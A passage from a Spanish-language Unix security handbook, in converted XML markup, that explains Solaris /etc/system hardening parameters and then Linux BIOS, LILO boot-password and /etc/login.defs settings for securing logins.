asignar un valor m&#x00E1;ximo hemos de editar el &#xFB01;chero /etc/system e incluir una l&#x02CA;&#x0131;nea como la
siguiente:

     </para><literallayout role="verbatim">
&#x00A0;set&#x00A0;maxuprc=60
</literallayout>
<!--l. 1494--><para>De esta forma limitamos el n&#x00FA;mero de procesos por usuario a 60 (un n&#x00FA;mero aceptable en la mayor&#x02CA;&#x0131;a de
sistemas <anchor 
   id="x1-143001f7"  ></anchor><footnote><para>     Aunque en algunos documentos se recomienda, para otros Unices, un n&#x00FA;mero m&#x00E1;ximo de 200 procesos
(<citation>[?]</citation>).</para></footnote>),
consiguiendo as&#x02CA;&#x0131; que un error en un programa no sea capaz de detener la m&#x00E1;quina.
<!--br/-->
<!--br/-->Un par&#x00E1;metro del sistema operativo especialmente importante, y que quiz&#x00E1;s nos interese modi&#xFB01;car (sobre
todo en m&#x00E1;quinas con pocos recursos) es maxusers. Al contrario de lo que mucha gente cree, maxusers no
hace referencia al n&#x00FA;mero m&#x00E1;ximo de usuarios que pueden conectar simult&#x00E1;neamente al sistema, sino
que es un valor que escala a otros par&#x00E1;metros del n&#x00FA;cleo (como max<informalequation><graphic 
fileref="unixsec103x.gif"></graphic></informalequation>nproc, n&#x00FA;mero m&#x00E1;ximo de
procesos en la tabla) o maxuprc. Para modi&#xFB01;carlo, podemos incluir en /etc/system una l&#x02CA;&#x0131;nea
con el valor deseado, generalmente el tama~no en MB de la memoria f&#x02CA;&#x0131;sica de nuestra m&#x00E1;quina
(<citation>[?]</citation>):

     </para><literallayout role="verbatim">
&#x00A0;set&#x00A0;maxusers=128
</literallayout>
<!--l. 1516--><para>Tambi&#x00E9;n puede ser conveniente limitar par&#x00E1;metros del sistema operativo relativos al sistema de &#xFB01;cheros, ya que
tambi&#x00E9;n se pueden producir negaciones de servicio relacionadas con ellos. Por ejemplo, es interesante poder
limitar el n&#x00FA;mero m&#x00E1;ximo de &#xFB01;cheros abiertos mediante los par&#x00E1;metros rlim<informalequation><graphic 
fileref="unixsec104x.gif"></graphic></informalequation>fd<informalequation><graphic 
fileref="unixsec105x.gif"></graphic></informalequation>max (l&#x02CA;&#x0131;mite hard) y
rlim<informalequation><graphic 
fileref="unixsec106x.gif"></graphic></informalequation>fd<informalequation><graphic 
fileref="unixsec107x.gif"></graphic></informalequation>cur (l&#x02CA;&#x0131;mite soft) o evitar que los usuarios puedan utilizar chown() en sus &#xFB01;cheros, especi&#xFB01;cando
un valor 1 para la variable rstchown (este es el comportamiento por defecto; si no lo seguimos,
aparte de comprometer la seguridad los usuarios sin privilegios podr&#x02CA;&#x0131;an ignorar el sistema de
quotas).
<!--br/-->
<!--br/-->Dejando ya de lado los l&#x02CA;&#x0131;mites que se pueden imponer a los recursos consumidos por los usuarios del
sistema, existe otra serie de par&#x00E1;metros del n&#x00FA;cleo interesantes para aumentar la seguridad de un sistema
Solaris. Por ejemplo, en algunas arquitecturas SPARC (concretamente en sun4u, sun4d y sun4m) es
posible, desde Solaris 2.6, establecer una protecci&#x00F3;n hardware para prevenir ataques de bu&#xFB00;er over&#xFB02;ow. Esta
protecci&#x00F3;n consiste en impedir que los programas puedan ejecutar c&#x00F3;digo en su pila, recibiendo la
se~nal SIGSEGV si tratan de hacerlo: para ello, en /etc/system hemos de incluir una l&#x02CA;&#x0131;nea
como

     </para><literallayout role="verbatim">
&#x00A0;set&#x00A0;noexec&#x005F;user&#x005F;stack=1
</literallayout>
<!--l. 1540--><para>Y si adem&#x00E1;s queremos monitorizar los intentos de ataque de este tipo (como mensajes del n&#x00FA;cleo de Solaris,
con priority &#x2018;kern&#x2019; y nivel &#x2018;notice&#x2019;, por defecto en /var/adm/messages), podemos incluir en el archivo
la l&#x02CA;&#x0131;nea

     </para><literallayout role="verbatim">
&#x00A0;set&#x00A0;noexec&#x005F;user&#x005F;stack&#x005F;log=1
</literallayout>
<!--l. 1549--><para>Si administramos un servidor NFS y deseamos que ignore las peticiones de clientes que no provengan de
puertos privilegiados (es decir, que no hayan sido solicitadas por un usuario privilegiado de la m&#x00E1;quina
cliente) podemos de&#xFB01;nir la variable NFS<informalequation><graphic 
fileref="unixsec108x.gif"></graphic></informalequation>PORTMON en /etc/system; si usamos versiones de Solaris
anteriores a la 2.5, debemos incluir una l&#x02CA;&#x0131;nea como

     </para><literallayout role="verbatim">
&#x00A0;set&#x00A0;nfs:nfs&#x005F;portmon&#x00A0;=&#x00A0;1
</literallayout>
<!--l. 1560--><para>mientras que en Solaris 2.5 y posteriores utilizaremos

     </para><literallayout role="verbatim">
&#x00A0;set&#x00A0;nfssrv:nfs&#x005F;portmon&#x00A0;=&#x00A0;1
</literallayout>
<!--l. 1566--><para>Por &#x00FA;ltimo, como ya comentamos en el punto dedicado a la seguridad EEPROM, podemos deshabilitar el
acceso que se consigue a la misma al pulsar la combinaci&#x00F3;n de teclas &#x2018;Stop&#x2013;A&#x2019; en un teclado Sun; para ello
es necesario a~nadir en el &#xFB01;chero /etc/system una entrada como

     </para><literallayout role="verbatim">
&#x00A0;set&#x00A0;abort&#x005F;enable=0
</literallayout>
<!--l. 1576--><para>Antes de &#xFB01;nalizar este punto, es necesario tener en cuenta que los cambios que se realicen en /etc/system
no tendr&#x00E1;n efecto hasta que la m&#x00E1;quina se reinicie, y que un peque~no error en los contenidos de este archivo
puede provocar que un sistema no arranque, por lo que es siempre recomendable guardar una copia antes
de realizar cualquier modi&#xFB01;caci&#x00F3;n del &#xFB01;chero.



</para><!--l. 1--><para>

  </para></section><!--end section--></section><!--end chapter--><!--l. 1--><section 
role="chapter"><title><anchor 
   id="x1-14400010"  ></anchor>Linux</title>
  <!--l. 2--><section 
role="section"><title><abbrev role="title-mark">10.1</abbrev><anchor 
   id="x1-14500010.1"  ></anchor>Introducci&#x00F3;n</title>
<!--l. 3--><para>  A mediados de 1991 un estudiante &#xFB01;nland&#x00E9;s llamado Linus Torvalds trabajaba en el dise~no de un sistema
operativo similar a Minix, que pudiera ejecutarse sobre plataformas Intel y compatibles, y sobre todo que
fuera peque~no y barato; a ra&#x02CA;&#x0131;z de un mensaje de este estudiante en comp.os.minix, algunas
personas comenzaron a interesarse por el proyecto, y &#xFB01;nalmente el 5 de octubre de ese a~no Linus
Torvals hizo p&#x00FA;blica la versi&#x00F3;n 0.02 &#x2013; la primera funcional &#x2013; de lo que ya se denominaba Linux
(Linus&#x02CA;
</para><!--l. 9--><para>  ). En esa versi&#x00F3;n, que aproximadamente utilizaron un centenar de usuarios, apenas se ofrec&#x02CA;&#x0131;a soporte a
hardware (excepto el que Linus ten&#x02CA;&#x0131;a en su ordenador), no dispon&#x02CA;&#x0131;a de subsistema de red ni de sistema de
&#xFB01;cheros propio, y las utilidades de espacio de usuario se pod&#x02CA;&#x0131;an contar con los dedos de las manos
(un shell, un compilador, y poco m&#x00E1;s). Sin embargo, y a pesar de las duras cr&#x02CA;&#x0131;ticas de pesos
pesados en el mundo de los sistemas operativos como Andrew Tanenbaum, el proyecto era muy
interesante, y poco a poco programadores de todo el mundo fueron aportando mejoras a este nuevo
sistema.
<!--br/-->
<!--br/-->A principios de 1994 apareci&#x00F3; Linux 1.0, considerada la primera versi&#x00F3;n del operativo utilizable no s&#x00F3;lo por
hackers y programadores, sino por usuarios &#x2018;normales&#x2019;; de las aproximadamente 10000 l&#x02CA;&#x0131;neas de la versi&#x00F3;n
inicial se hab&#x02CA;&#x0131;a pasado a unas 170000, y el centenar de usuarios se hab&#x02CA;&#x0131;a multiplicado por mil.
Linux 1.0 incorporaba subsistema de red (sin duda uno de los cambios que m&#x00E1;s ha contribuido
a la expansi&#x00F3;n del operativo), entorno gr&#x00E1;&#xFB01;co (arrastrado de versiones anteriores) y soporte
a una gama de hardware relativamente amplia. La popularidad del operativo crec&#x02CA;&#x0131;a mes a
mes &#x2013; especialmente en entornos universitarios y de investigaci&#x00F3;n &#x2013; gracias sobre todo a su
&#xFB01;losof&#x02CA;&#x0131;a: cualquiera pod&#x02CA;&#x0131;a (y puede) modi&#xFB01;car una parte del n&#x00FA;cleo, adaptarla, mejorarla, o
incorporar nuevas l&#x02CA;&#x0131;neas, con la &#x00FA;nica obligaci&#x00F3;n de compartir el nuevo c&#x00F3;digo fuente con el resto del
mundo.
<!--br/-->
<!--br/-->Sin embargo, no fu&#x00E9; hasta 1996, con la aparici&#x00F3;n de Linux 2.0 (que incorporaba casi medio mill&#x00F3;n de l&#x02CA;&#x0131;neas de
c&#x00F3;digo), cuando se produjo el gran boom de Linux que perdura hasta la actualidad. Esta nueva versi&#x00F3;n
convert&#x02CA;&#x0131;a a Linux en un sistema libre que, en algunos aspectos, no ten&#x02CA;&#x0131;a nada que envidiar a entornos Unix
comerciales; m&#x00E1;s de un mill&#x00F3;n de usuarios contribu&#x02CA;&#x0131;an sin descanso a mejorar el sistema, y quiz&#x00E1;s por primera
vez la arquitectura PC no era un mercado reservado casi en exclusiva a Microsoft. Muchas
personas vieron que Linux pod&#x02CA;&#x0131;a llegar a ser rentable (a pesar de su &#xFB01;losof&#x02CA;&#x0131;a free), y se comenz&#x00F3; a
trabajar mucho en la facilidad de instalaci&#x00F3;n y manejo para usuarios sin elevados conocimientos de
inform&#x00E1;tica; incluso llegaba a desbancar en muchas ocasiones al inamovible Minix a la hora de
estudiar dise~no de sistemas operativos en las universidades (algo poco comprensible, por otra
parte, ya que cualquiera que le haya pegado un vistazo al c&#x00F3;digo del kernel de Linux podr&#x00E1;
comprobar que a diferencia de Minix no est&#x00E1; dise~nado para ser legible y did&#x00E1;ctico, sino para ser
r&#x00E1;pido).
<!--br/-->
<!--br/-->En la actualidad Linux cuenta con varios millones de usuarios, y se ha convertido en el Unix m&#x00E1;s
user&#x2013;friendly de todos los existentes, ya que no hacen falta conocimientos avanzados para instalarlo y
manejarlo m&#x02CA;&#x0131;nimamente; reconoce multitud de hardware (algo que siempre ayuda en el mercado de los
ordenadores de sobremesa), y se puede utilizar para funciones tan diversas como servidores web, de bases
de datos, de correo electr&#x00F3;nico, o como una sencilla workstation. En muchas empresas medianas y peque~nas
ha desplazado por completo a los sistemas Unix comerciales (caros y que generalmente corren sobre
hardware que tampoco es barato), e incluso en grandes servidores se utiliza Linux como sistema operativo;
aunque &#x2013; y esto es una cr&#x02CA;&#x0131;tica, por si no queda claro &#x2013; en algunas ocasiones se echan de menos
mecanismos de seguridad que s&#x02CA;&#x0131; est&#x00E1;n disponibles en otros Unices, podemos decir que Linux
proporciona un nivel de seguridad, &#xFB01;abilidad y estabilidad adecuado a la mayor parte de aplicaciones
gen&#x00E9;ricas que nos podamos imaginar (es decir, no es un operativo apto para controlar una central
nuclear, pero s&#x02CA;&#x0131; para cualquier aplicaci&#x00F3;n de criticidad baja o media que podamos utilizar d&#x02CA;&#x0131;a a
d&#x02CA;&#x0131;a).
<!--br/-->
<!--br/-->Al igual que hemos hecho en el cap&#x02CA;&#x0131;tulo anterior con Solaris, vamos a hablar en este de aspectos de

seguridad espec&#x02CA;&#x0131;&#xFB01;cos de Linux, aunque como siempre lo que hemos comentado para Unix en general es casi
siempre aplicable a este clon. Sobre temas propios de Linux podemos obtener informaci&#x00F3;n adicional y
gratuita a trav&#x00E9;s de Internet, en cualquier documento del proyecto LDP (Linux Documentation Project);
tambi&#x00E9;n existen numerosos libros sobre aspectos espec&#x02CA;&#x0131;&#xFB01;cos de este operativo, desde la implementaci&#x00F3;n de su
n&#x00FA;cleo (<citation>[?]</citation>, <citation>[?]</citation>&#x2026;) hasta su seguridad (<citation>[?]</citation>, <citation>[?]</citation>&#x2026;), pasando por supuesto por temas de administraci&#x00F3;n gen&#x00E9;rica
(<citation>[?]</citation>, <citation>[?]</citation>&#x2026;).
  </para></section><!--end section--><!--l. 75--><section 
role="section"><title><abbrev role="title-mark">10.2</abbrev><anchor 
   id="x1-14600010.2"  ></anchor>Seguridad f&#x02CA;&#x0131;sica en x86</title>
<!--l. 76--><para>  Si cuando hemos hablado de Solaris hac&#x02CA;&#x0131;amos referencia al nivel de seguridad m&#x00E1;s bajo que ofrece una
m&#x00E1;quina SPARC, el correspondiente a su EEPROM, parece obligatorio comentar, en el cap&#x02CA;&#x0131;tulo dedicado a
Linux, de la seguridad de m&#x00E1;s bajo nivel que ofrece este operativo ejecut&#x00E1;ndose sobre su principal
plataforma: el PC.
<!--br/-->
<!--br/-->Cuando arranca un ordenador personal se ejecuta un software denominado BIOS (Basic I/O System) cuya
funci&#x00F3;n principal es determinar una serie de par&#x00E1;metros de la m&#x00E1;quina y proporcionar un sistema b&#x00E1;sico de
control de dispositivos, como el teclado o los puertos de comunicaciones; este software se aloja
t&#x02CA;&#x0131;picamente en una memoria ROM (Read&#x2013;Only Memory) o &#xFB02;ash (estos &#x00FA;ltimos permiten actualizar la
versi&#x00F3;n de la BIOS sin necesidad de cambiar el chip correspondiente), de forma que se permita
autoarrancar a la m&#x00E1;quina aunque el subsistema de almacenamiento tenga problemas y no se
pueda iniciar el operativo. En el arranque de un PC se puede acceder a la con&#xFB01;guraci&#x00F3;n de
su BIOS mediante la pulsaci&#x00F3;n de una tecla o una secuencia de escape dependiente de cada
modelo de chip; desde ese entorno de con&#xFB01;guraci&#x00F3;n se pueden asignar par&#x00E1;metros como la fecha y
hora del sistema, la arquitectura de los discos duros, o la habilitaci&#x00F3;n de memorias cach&#x00E9;. Por
supuesto, la BIOS de un PC es completamente independiente del operativo que se arranque despu&#x00E9;s;
esto implica que cuando a continuaci&#x00F3;n comentemos la protecci&#x00F3;n que ofrece una BIOS, lo que
digamos ser&#x00E1; aplicable sin importar qu&#x00E9; operativo se ejecute en la m&#x00E1;quina: servir&#x00E1; tanto
para Linux como para Solaris, FreeBSD, NetBSD&#x2026;e incluso para las diferentes versiones de
Windows. Si lo comentamos en este cap&#x02CA;&#x0131;tulo dedicado a Linux y no en otro, es &#x00FA;nicamente
porque la mayor parte de plataformas sobre las que se ejecuta este operativo son ordenadores
personales.
<!--br/-->
<!--br/-->Generalmente la mayor parte de las BIOS ofrecen la posibilidad de establecer dos contrase~nas
independientes. La primera de ellas es una clave que evita a usuarios que no la conozcan acceder a la
con&#xFB01;guraci&#x00F3;n de la BIOS, ya que se solicitar&#x00E1; al pulsar la secuencia de escape de la que hemos hablado antes
para entrar en el entorno de con&#xFB01;guraci&#x00F3;n durante el arranque de una m&#x00E1;quina. El esquema de esta
contrase~na en muchas ocasiones no es todo lo robusto que debiera, y en funci&#x00F3;n del modelo y versi&#x00F3;n de cada
chip de memoria &#x2013; especialmente en los m&#x00E1;s antiguos &#x2013; es posible que incluso se pueda romper ejecutando
un simple programa desde l&#x02CA;&#x0131;nea de &#x00F3;rdenes; a pesar de ello, puede ser &#x00FA;til en entornos de muy baja seguridad
para prevenir que cualquiera se dedique a cambiar la con&#xFB01;guraci&#x00F3;n de la BIOS, pero m&#x00E1;s por comodidad (el
administrador de la m&#x00E1;quina deber&#x02CA;&#x0131;a restaurar dicha con&#xFB01;guraci&#x00F3;n de nuevo, algo bastante molesto
sobre todo si el n&#x00FA;mero de ordenadores es elevado, como en un laboratorio o un aula) que por
seguridad.
<!--br/-->
<!--br/-->La segunda de estas claves ofrece un nivel de protecci&#x00F3;n algo m&#x00E1;s elevado; se trata de una contrase~na que
evita el arranque del PC sin que se teclee el password (en local, por supuesto, recordemos que el
operativo a&#x00FA;n no se ha inicializado). Con ella se consigue que nadie que no conozca la clave pueda
arrancar un ordenador, pero una vez arrancado no sirve para nada m&#x00E1;s; puede ser &#x00FA;til para
evitar que usuarios no autorizados puedan sentarse delante de una m&#x00E1;quina y arrancar desde un
diskette, aunque seguramente una soluci&#x00F3;n menos agresiva es con&#xFB01;gurar la BIOS para que s&#x00F3;lo
arranque desde disco duro, o al menos no trate de hacerlo desde &#xFB02;oppy antes que desde el
disco primario. No obstante, poner una contrase~na para arrancar el sistema, como muchas
medidas de seguridad, puede tener efectos negativos en la funcionalidad o en la comodidad de
administraci&#x00F3;n: no podremos realizar reboots autom&#x00E1;ticos ni remotos de Unix, ya que cada vez que
el sistema reinicie alguien deber&#x00E1; estar f&#x02CA;&#x0131;sicamente al lado de la m&#x00E1;quina para teclear la clave
correspondiente.

<!--br/-->
<!--br/-->Antes de &#xFB01;nalizar este punto dedicado a la seguridad f&#x02CA;&#x0131;sica dentro de Linux debemos hablar
de la protecci&#x00F3;n ofrecida por LILO; ahora ya no se trata de algo gen&#x00E9;rico de los PCs, sino de
mecanismos implantados en el cargador de Linux que s&#x00F3;lo son aplicables a sistemas arrancados desde
dicho cargador. LILO (LInux LOader) es un software que se instala en un sector de arranque &#x2013;
de una partici&#x00F3;n o de un diskette &#x2013; o en el Master Boot Record (MBR) del disco duro y que
permite de esta forma arrancar tanto Linux como otros sistemas operativos instalados en el
PC.
<!--br/-->
<!--br/-->LILO toma su con&#xFB01;guraci&#x00F3;n del archivo /etc/lilo.conf del sistema Linux; cada vez que modi&#xFB01;quemos ese
archivo ser&#x00E1; necesario ejecutar la orden /sbin/lilo si queremos que los cambios tengan efecto en el
siguiente encendido de la m&#x00E1;quina:

     </para><literallayout role="verbatim">
&#x00A0;luisa:~#&#x00A0;/sbin/lilo
&#x00A0;Added&#x00A0;linux&#x00A0;*
&#x00A0;luisa:~#
</literallayout>
<!--l. 152--><para>Al arrancar el PC, LILO permite elegir una imagen para ser arrancada, as&#x02CA;&#x0131; como especi&#xFB01;car par&#x00E1;metros para
el n&#x00FA;cleo; aunque esto sea necesario para inicializar el sistema en ciertas ocasiones &#x2013; principalmente cuando
hay errores graves en un arranque normal &#x2013;, el hecho es que los par&#x00E1;metros pasados a un kernel antes de ser
arrancado pueden facilitar a un atacante un control total sobre la m&#x00E1;quina, ya que algunos
de ellos llegan incluso a ejecutar un shell con privilegios de root sin necesidad de ninguna
contrase~na.
<!--br/-->
<!--br/-->En determinadas ocasiones, quiz&#x00E1;s nos interese proteger el arranque de una m&#x00E1;quina, tanto a nivel de la
elecci&#x00F3;n de n&#x00FA;cleo a arrancar como a nivel de las opciones que se pasan a dicho n&#x00FA;cleo. Podemos habilitar
desde LILO el uso de una contrase~na que se solicitar&#x00E1; antes de que LILO cargue cualquier sistema
operativo instalado en el ordenador; para ello debemos hacer uso de la directiva &#x2018;password&#x2019; en
/etc/lilo.conf:

     </para><literallayout role="verbatim">
&#x00A0;luisa:~#&#x00A0;cat&#x00A0;/etc/lilo.conf
&#x00A0;boot&#x00A0;=&#x00A0;/dev/hda
&#x00A0;delay&#x00A0;=&#x00A0;50
&#x00A0;vga&#x00A0;=&#x00A0;normal
&#x00A0;password&#x00A0;=&#x00A0;P,e+bqa
&#x00A0;image&#x00A0;=&#x00A0;/vmlinuz
&#x00A0;&#x00A0;&#x00A0;root&#x00A0;=&#x00A0;/dev/hda1
&#x00A0;&#x00A0;&#x00A0;label&#x00A0;=&#x00A0;linux
&#x00A0;&#x00A0;&#x00A0;read-only
&#x00A0;luisa:~#
</literallayout>
<!--l. 180--><para>Tras ejecutar /sbin/lilo, en el siguiente arranque de la m&#x00E1;quina se solicitar&#x00E1; la contrase~na especi&#xFB01;cada antes
de arrancar cualquier sistema operativo; es importante que /etc/lilo.conf tenga un permiso de lectura
s&#x00F3;lo para el root, ya que como podemos ver contiene contrase~nas sin cifrar.
<!--br/-->
<!--br/-->Evidentemente, si elegimos este tipo de protecci&#x00F3;n nos podemos olvidar de cualquier cosa que implique un
reinicio autom&#x00E1;tico del ordenador, ya que como acabamos de decir siempre se solicitar&#x00E1; una clave
en el arranque; podemos relajar esta restricci&#x00F3;n de una forma muy &#x00FA;til: forzando el uso de un
password s&#x00F3;lo si se especi&#xFB01;can par&#x00E1;metros adicionales para el n&#x00FA;cleo que se quiere arrancar. Esto
permite un equilibrio m&#x00E1;s que razonable entre seguridad y usabilidad, ya que cualquiera &#x2013; con los
privilegios necesarios &#x2013; puede reiniciar el sistema, e incluso se pueden programar rearranques
autom&#x00E1;ticos, pero siempre ser&#x00E1; necesaria una clave si alguien desea especi&#xFB01;car par&#x00E1;metros adicionales al
kernel.
<!--br/-->
<!--br/-->Para conseguir esto utilizaremos la directiva &#x2018;restricted&#x2019; en conjunci&#x00F3;n con &#x2018;password&#x2019; en el archivo de
con&#xFB01;guraci&#x00F3;n de LILO; bas&#x00E1;ndonos en el ejemplo anterior, el contenido del nuevo &#xFB01;chero ser&#x02CA;&#x0131;a el
siguiente:

     </para><literallayout role="verbatim">
&#x00A0;luisa:~#&#x00A0;cat&#x00A0;/etc/lilo.conf
&#x00A0;boot&#x00A0;=&#x00A0;/dev/hda
&#x00A0;delay&#x00A0;=&#x00A0;50
&#x00A0;vga&#x00A0;=&#x00A0;normal
&#x00A0;password&#x00A0;=&#x00A0;P,e+bqa
&#x00A0;restricted
&#x00A0;image&#x00A0;=&#x00A0;/vmlinuz
&#x00A0;&#x00A0;&#x00A0;root&#x00A0;=&#x00A0;/dev/hda1
&#x00A0;&#x00A0;&#x00A0;label&#x00A0;=&#x00A0;linux
&#x00A0;&#x00A0;&#x00A0;read-only
&#x00A0;luisa:~#
</literallayout>
<!--l. 214--><para>Los dos par&#x00E1;metros que acabamos de ver (&#x2018;password&#x2019; y &#x2018;restricted&#x2019; se pueden utilizar y combinar bien en
la con&#xFB01;guraci&#x00F3;n general de LILO &#x2013; como lo hemos visto aqu&#x02CA;&#x0131; &#x2013; o bien en la con&#xFB01;guraci&#x00F3;n particular de
cada uno de los sistemas operativos a arrancar; si queremos esto &#x00FA;ltimo no tenemos m&#x00E1;s que
incluir las directivas dentro de la con&#xFB01;guraci&#x00F3;n de las entradas &#x2018;image&#x2019; (im&#x00E1;genes del kernel de
Linux) u &#x2018;other&#x2019; (arranque de otros sistemas operativos) en lugar de hacerlo antes de estas
entradas:

     </para><literallayout role="verbatim">
&#x00A0;luisa:~#&#x00A0;cat&#x00A0;/etc/lilo.conf
&#x00A0;boot&#x00A0;=&#x00A0;/dev/hda
&#x00A0;delay&#x00A0;=&#x00A0;50
&#x00A0;vga&#x00A0;=&#x00A0;normal
&#x00A0;image&#x00A0;=&#x00A0;/vmlinuz
&#x00A0;&#x00A0;&#x00A0;root&#x00A0;=&#x00A0;/dev/hda1
&#x00A0;&#x00A0;&#x00A0;label&#x00A0;=&#x00A0;linux
&#x00A0;&#x00A0;&#x00A0;read-only
&#x00A0;&#x00A0;&#x00A0;password&#x00A0;=&#x00A0;66n4k
&#x00A0;&#x00A0;&#x00A0;restricted
&#x00A0;luisa:~#
</literallayout>
<!--l. 237--><para>De esta forma podemos particularizar claves para cada sistema o n&#x00FA;cleo, de&#xFB01;nir entradas en las que se
necesitar&#x00E1; la clave s&#x00F3;lo si pasamos par&#x00E1;metros en el arranque, entradas en las que se necesitar&#x00E1; siempre,
entradas en las que no se necesitar&#x00E1; nunca, etc.
<!--br/-->
<!--br/-->Para &#xFB01;nalizar este punto, es necesario recordar una vez m&#x00E1;s que una correcta con&#xFB01;guraci&#x00F3;n del arranque en
la BIOS es imprescindible para garantizar la seguridad f&#x02CA;&#x0131;sica de la m&#x00E1;quina; sin ir m&#x00E1;s lejos, si un pirata
consigue arrancar el ordenador desde un diskette, poseer&#x00E1; un control total del sistema sin importar las
claves que tengamos de&#xFB01;nidas en /etc/lilo.conf.
  </para></section><!--end section--><!--l. 247--><section 
role="section"><title><abbrev role="title-mark">10.3</abbrev><anchor 
   id="x1-14700010.3"  ></anchor>Usuarios y accesos al sistema</title>
<!--l. 248--><para>  En un sistema Linux es posible controlar ciertos par&#x00E1;metros referentes al acceso de los usuarios a trav&#x00E9;s de
telnet o r-<informalequation><graphic 
fileref="unixsec109x.gif"></graphic></informalequation> mediante el &#xFB01;chero /etc/login.defs; sus directivas no afectan directamente &#x2013; aunque algunas
de ellas s&#x02CA;&#x0131; de una forma indirecta &#x2013; a las conexiones a trav&#x00E9;s de otros mecanismos como SSH, que poseen
sus propios &#xFB01;cheros de con&#xFB01;guraci&#x00F3;n. Como siempre, insistimos en la necesidad de sustituir
todos los protocolos en claro por equivalentes cifrados, con lo que ni telnet ni r-<informalequation><graphic 
fileref="unixsec110x.gif"></graphic></informalequation> deber&#x02CA;&#x0131;an
existir como servicio en una m&#x00E1;quina Unix, pero de cualquier forma vamos a comentar algunas
directivas del &#xFB01;chero anterior que pueden resultar interesantes para nuestra seguridad, tanto
si afectan a las conexiones remotas como si no; para obtener informaci&#x00F3;n acerca del resto de
directivas &#x2013; y tambi&#x00E9;n de las comentadas aqu&#x02CA;&#x0131; &#x2013; podemos consultar la p&#x00E1;gina del manual de
login.defs(5).
<!--br/-->
<!--br/-->La primera de las directivas que encontramos en /etc/login.defs es FAIL<informalequation><graphic 
fileref="unixsec111x.gif"></graphic></informalequation>DELAY, que marca el n&#x00FA;mero de
segundos (por defecto, 3) que el sistema introduce como retardo desde que se introduce un nombre de
usuario o contrase~na incorrectos hasta que se vuelve a solicitar el login de entrada al sistema; el
n&#x00FA;mero m&#x00E1;ximo de intentos antes de que se cierre la conexi&#x00F3;n viene determinado por el valor de
LOGIN<informalequation><graphic 
fileref="unixsec112x.gif"></graphic></informalequation>RETRIES, por defecto a 5, y el tiempo m&#x00E1;ximo durante el que se permite la entrada antes
de cerrar la conexi&#x00F3;n se especi&#xFB01;ca mediante la directiva LOGIN<informalequation><graphic 
fileref="unixsec113x.gif"></graphic></informalequation>TIMEOUT (60 segundos por
defecto).
<!--br/-->
<!--br/-->Cuando un usuario se equivoca en su nombre de entrada o su clave entran en juego un par de directivas
m&#x00E1;s: FAILLOG<informalequation><graphic 
fileref="unixsec114x.gif"></graphic></informalequation>ENAB y LOG<informalequation><graphic 
fileref="unixsec115x.gif"></graphic></informalequation>UNKFAIL<informalequation><graphic 
fileref="unixsec116x.gif"></graphic></informalequation>ENAB. La primera de ellas, con un valor por defecto a &#x2018;yes&#x2019; (el
adecuado para nuestra seguridad), se encarga de registrar los intentos fallidos de acceso al sistema en
/var/log/faillog, as&#x02CA;&#x0131; como de mostrar un mensaje con informaci&#x00F3;n acerca del &#x00FA;ltimo intento de acceso
fallido cuando un usuario accede a la m&#x00E1;quina. Por su parte, LOG<informalequation><graphic 
fileref="unixsec117x.gif"></graphic></informalequation>UNKFAIL<informalequation><graphic 
fileref="unixsec118x.gif"></graphic></informalequation>ENAB habilita o deshabilita el
registro del nombre de usuario que ha fallado al tratar de entrar al sistema; es importante que su valor sea
&#x2018;no&#x2019; (es decir, que ese nombre de usuario no se registre) por una sencilla raz&#x00F3;n: en muchas ocasiones los
usuarios teclean su password en lugar de su login cuando tratan de acceder a la m&#x00E1;quina, con lo que si
el nombre de usuario incorrecto &#x2013; la clave &#x2013; se registra en un &#xFB01;chero en texto plano, y ese
&#xFB01;chero tiene unos permisos inadecuados, cualquiera con acceso de lectura sobre el archivo de

log podr&#x02CA;&#x0131;a deducir f&#x00E1;cilmente el nombre y la clave del usuario. Adicionalmente, si la directiva
FTMP<informalequation><graphic 
fileref="unixsec119x.gif"></graphic></informalequation>FILE de&#xFB01;ne un archivo (por defecto, /var/log/btmp), en el mismo se registra cada intento de
acceso fallido en formato utmp(5); dicha informaci&#x00F3;n se puede consultar mediante la orden
lastb.
<!--br/-->
<!--br/-->Si se produce la situaci&#x00F3;n contraria a la que acabamos de comentar (es decir, el usuario teclea
correctamente tanto su nombre como su contrase~na), la directiva LOG<informalequation><graphic 
fileref="unixsec120x.gif"></graphic></informalequation>OK<informalequation><graphic 
fileref="unixsec121x.gif"></graphic></informalequation>LOGINS habilita o deshabilita el
registro de este hecho en funci&#x00F3;n de si su valor es &#x2018;yes&#x2019; o &#x2018;no&#x2019;; adem&#x00E1;s, si LASTLOG<informalequation><graphic 
fileref="unixsec122x.gif"></graphic></informalequation>ENAB tiene un valor
&#x2018;yes&#x2019; se registra la entrada en /var/log/lastlog y se muestra al usuario informaci&#x00F3;n acerca de su &#x00FA;ltima
conexi&#x00F3;n. En caso de que el usuario no pueda acceder a su directorio $HOME (bien porque no existe, bien
por los permisos del mismo) entra en juego DEFAULT<informalequation><graphic 
fileref="unixsec123x.gif"></graphic></informalequation>HOME, y en caso de que su valor sea &#x2018;no&#x2019; no se
permite el acceso; por el contrario, si su valor es &#x2018;yes&#x2019;, el usuario entra al directorio raiz de la
m&#x00E1;quina.
<!--br/-->
<!--br/-->En /etc/login.defs tambi&#x00E9;n se pueden de&#xFB01;nir l&#x02CA;&#x0131;neas para las que no es necesaria ninguna contrase~na,
mediante la directiva NO<informalequation><graphic 
fileref="unixsec124x.gif"></graphic></informalequation>PASSWORD<informalequation><graphic 
fileref="unixsec125x.gif"></graphic></informalequation>CONSOLE: si alguien trata de conectar al sistema a trav&#x00E9;s de ellas, se
le solicitar&#x00E1; su nombre de usuario pero no su clave; esto es aplicable para todos los usuarios de la
m&#x00E1;quina excepto para el administrador, al que siempre se le pide su password. Evidentemente,
para incrementar la seguridad de nuestro sistema la directiva correspondiente ha de estar
comentada.
<!--br/-->
<!--br/-->El acceso a la cuenta del superusuario tambi&#x00E9;n viene determinado por ciertas directivas del
archivo /etc/login.defs. En primer lugar, s&#x00F3;lo se permiten accesos directos como root desde
las l&#x02CA;&#x0131;neas de&#xFB01;nidas en la entrada CONSOLE, que puede ser bien un archivo que contiene los
nombres de dispositivos desde los que permitimos la entrada del administrador, o bien una
relaci&#x00F3;n de esos dispositivos separados por el car&#x00E1;cter &#x2018;:&#x2019;; por defecto, en un sistema Linux esta
entrada referencia al archivo /etc/securetty, que es un listado de terminales de la forma
siguiente:

     </para><literallayout role="verbatim">
&#x00A0;luisa:~#&#x00A0;cat&#x00A0;/etc/securetty
&#x00A0;console
&#x00A0;tty1
&#x00A0;tty2
&#x00A0;tty3
&#x00A0;tty4
&#x00A0;tty5
&#x00A0;tty6
&#x00A0;luisa:~#
</literallayout>
